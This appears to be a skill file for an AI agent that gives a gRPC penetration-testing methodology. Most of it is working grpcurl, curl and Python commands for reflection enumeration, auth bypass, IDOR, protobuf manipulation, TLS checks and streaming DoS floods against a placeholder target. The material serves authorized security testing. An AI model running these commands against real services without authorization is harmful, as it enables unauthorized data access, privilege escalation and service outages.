---
name: grpc
description: gRPC security testing covering reflection enumeration, protobuf manipulation, auth bypass, TLS misconfig, and streaming abuse
---

# gRPC Security Testing

Security testing methodology for gRPC services. Focus on service enumeration via reflection, protobuf message manipulation, authentication/authorization bypass, TLS misconfiguration, and denial of service through streaming abuse.

## Attack Surface

**Service Discovery**
- gRPC reflection API enabled in production
- Proto file exposure via source maps, documentation, or client bundles
- Service listing on well-known ports (50051 by default, but any port)

**Authentication**
- Missing or optional metadata-based auth (Bearer tokens in gRPC metadata)
- Missing interceptors on specific methods
- mTLS not enforced or certificate validation disabled

**Message Layer**
- Protobuf field manipulation (type confusion, unknown fields, default values)
- Missing server-side validation relying on proto schema alone
- Large message payloads exceeding expected bounds

**Streaming**
- Bidirectional streaming without rate limiting
- Stream lifecycle abuse (never closing, rapid open/close)
- Server-side streaming resource exhaustion

## Reconnaissance

### Service Enumeration via Reflection

```bash
# List all services
grpcurl -plaintext target.com:50051 list
# Output: grpc.reflection.v1alpha.ServerReflection, myapp.UserService, myapp.AdminService

# List methods on a service
grpcurl -plaintext target.com:50051 list myapp.UserService
# Output: myapp.UserService.GetUser, myapp.UserService.ListUsers, myapp.UserService.UpdateUser

# Describe a service (full proto definition)
grpcurl -plaintext target.com:50051 describe myapp.UserService
grpcurl -plaintext target.com:50051 describe myapp.UserService.GetUser

# Describe message types
grpcurl -plaintext target.com:50051 describe myapp.GetUserRequest
grpcurl -plaintext target.com:50051 describe myapp.UserResponse

# With TLS (no cert verification for testing)
grpcurl -insecure target.com:443 list
```

### Proto File Discovery

```bash
# Check for exposed proto files
curl -s https://target.com/proto/user.proto
curl -s https://target.com/api/protos
# Check JavaScript bundles for embedded proto definitions
curl -s https://target.com/static/js/main.js | grep -oE 'proto\.[a-zA-Z]+|message [A-Z][a-zA-Z]+'
# Check gRPC-Web proxy endpoints
curl -s https://target.com/grpc-web/
```

## Key Vulnerabilities

### Authentication Bypass

```bash
# Test unauthenticated access to all methods
grpcurl -plaintext target.com:50051 myapp.AdminService.ListUsers
grpcurl -plaintext -d '{"user_id":"1"}' target.com:50051 myapp.AdminService.GetUser

# Test with empty/invalid auth metadata
grpcurl -plaintext -H "authorization: Bearer " target.com:50051 myapp.AdminService.ListUsers
grpcurl -plaintext -H "authorization: Bearer invalid" target.com:50051 myapp.AdminService.ListUsers
grpcurl -plaintext -H "authorization: " target.com:50051 myapp.AdminService.ListUsers

# Test per-method auth (some methods may lack interceptors)
# Enumerate all methods and test each without credentials
for method in $(grpcurl -plaintext target.com:50051 list myapp.UserService); do
  echo "Testing: $method"
  grpcurl -plaintext target.com:50051 "$method" 2>&1 | head -3
  echo "---"
done
```

### Authorization Bypass (Per-Method)

```bash
# Access admin methods with regular user token
grpcurl -plaintext -H "authorization: Bearer USER_TOKEN" \
  -d '{"user_id":"other_user_id"}' \
  target.com:50051 myapp.AdminService.DeleteUser

# IDOR via gRPC - access other users' data
grpcurl -plaintext -H "authorization: Bearer USER_TOKEN" \
  -d '{"user_id":"victim_id"}' \
  target.com:50051 myapp.UserService.GetUser

# Test horizontal privilege escalation across methods
grpcurl -plaintext -H "authorization: Bearer USER_TOKEN" \
  -d '{"user_id":"victim_id","role":"admin"}' \
  target.com:50051 myapp.UserService.UpdateUser
```

### Protobuf Message Manipulation

```bash
# Add unknown fields (proto3 preserves unknown fields by default)
# Field numbers not in the schema may be passed to backend logic
grpcurl -plaintext -d '{"user_id":"1","unknown_field_999":"admin"}' \
  target.com:50051 myapp.UserService.GetUser

# Type confusion - send wrong types for fields
grpcurl -plaintext -d '{"user_id":0}' target.com:50051 myapp.UserService.GetUser
grpcurl -plaintext -d '{"user_id":-1}' target.com:50051 myapp.UserService.GetUser
grpcurl -plaintext -d '{"amount":9999999999999}' target.com:50051 myapp.PaymentService.Transfer

# Default value bypass - proto3 default values (0, "", false) may bypass checks
grpcurl -plaintext -d '{"role":0}' target.com:50051 myapp.UserService.UpdateRole
# 0 is default enum value - might map to ADMIN if enum starts at 0

# Repeated field abuse - send arrays where single value expected
grpcurl -plaintext -d '{"ids":["1","2","3","4","5"]}' target.com:50051 myapp.UserService.BatchGet

# oneof field confusion - set multiple oneof fields
grpcurl -plaintext -d '{"email":"a@b.com","phone":"123","admin_override":true}' \
  target.com:50051 myapp.UserService.UpdateContact
```

### TLS Misconfiguration

```bash
# Check if plaintext (no TLS) is accepted
grpcurl -plaintext target.com:50051 list

# Check TLS configuration
echo | openssl s_client -connect target.com:50051 -alpn h2 2>/dev/null | openssl x509 -noout -text | head -30

# Test without client cert when mTLS should be required
grpcurl -insecure target.com:50051 list

# Check if server accepts any client certificate
grpcurl -insecure -cert /tmp/self-signed.pem -key /tmp/self-signed.key target.com:50051 list

# Verify certificate hostname matches
echo | openssl s_client -connect target.com:50051 -servername target.com 2>/dev/null | grep -i verify
```

### DoS via Streaming Abuse

```bash
# Server streaming - request massive result set
grpcurl -plaintext -d '{"page_size":999999}' target.com:50051 myapp.UserService.StreamAllUsers

# Client streaming - send large number of messages without server processing
# Custom script needed for streaming abuse
python3 -c "
import grpc
import myapp_pb2, myapp_pb2_grpc
channel = grpc.insecure_channel('target.com:50051')
stub = myapp_pb2_grpc.UserServiceStub(channel)
def generate():
    for i in range(1000000):
        yield myapp_pb2.DataChunk(data=b'A'*1024*1024)  # 1MB per chunk
stub.Upload(generate())
"

# Large single message
grpcurl -plaintext -d "{\"data\":\"$(python3 -c "print('A'*10000000)")\"}" \
  target.com:50051 myapp.DataService.Process

# Rapid connection/stream cycling
for i in $(seq 1 100); do
  grpcurl -plaintext -max-time 1 target.com:50051 myapp.UserService.StreamUpdates &
done
wait
```

## gRPC-Web Testing

```bash
# gRPC-Web uses HTTP/1.1 POST with specific content-types
curl -X POST https://target.com/myapp.UserService/GetUser \
  -H "Content-Type: application/grpc-web+proto" \
  -H "X-Grpc-Web: 1" \
  --data-binary @request.bin

# gRPC-Web with JSON encoding
curl -X POST https://target.com/myapp.UserService/GetUser \
  -H "Content-Type: application/grpc-web-text+proto" \
  -H "X-Grpc-Web: 1" \
  -d '{"user_id":"1"}'
```

## Tools

```bash
# grpcurl - command-line gRPC client
grpcurl -plaintext target.com:50051 list

# grpcui - web-based gRPC GUI (like Postman for gRPC)
grpcui -plaintext target.com:50051

# protoc - decode raw protobuf messages
echo "BINARY_DATA" | protoc --decode_raw
# Decode with known proto file
protoc --decode=myapp.UserResponse user.proto < response.bin

# Burp/Caido with gRPC extensions for intercepting gRPC-Web traffic
```

## Testing Methodology

1. **Service discovery** - Check for reflection API, enumerate all services and methods
2. **Schema mapping** - Describe all message types, identify sensitive fields and admin methods
3. **Auth testing** - Test every method without credentials, with invalid tokens, with user-level tokens on admin methods
4. **Per-method authorization** - Verify RBAC on each individual RPC method, not just service level
5. **Message manipulation** - Unknown fields, type confusion, default value bypass, large payloads
6. **TLS verification** - Check plaintext fallback, certificate validation, mTLS enforcement
7. **Streaming abuse** - Test resource limits on all streaming RPCs
8. **gRPC-Web** - If proxy exists, test for additional attack surface via HTTP/1.1

## Validation

- Demonstrate reflection API exposing full service schema in production
- Show unauthenticated or unauthorized access to sensitive RPC methods
- Prove IDOR by accessing other users' data through gRPC calls
- Document message manipulation that bypasses validation (unknown fields, default values)
- Show plaintext gRPC accepted when TLS should be required

## Impact

- Full API schema disclosure via reflection enabling targeted attacks
- Authentication bypass on methods missing interceptor configuration
- Data access and manipulation through IDOR in protobuf message fields
- Service disruption via streaming abuse or large message payloads
- Privilege escalation through default enum values or unknown field injection
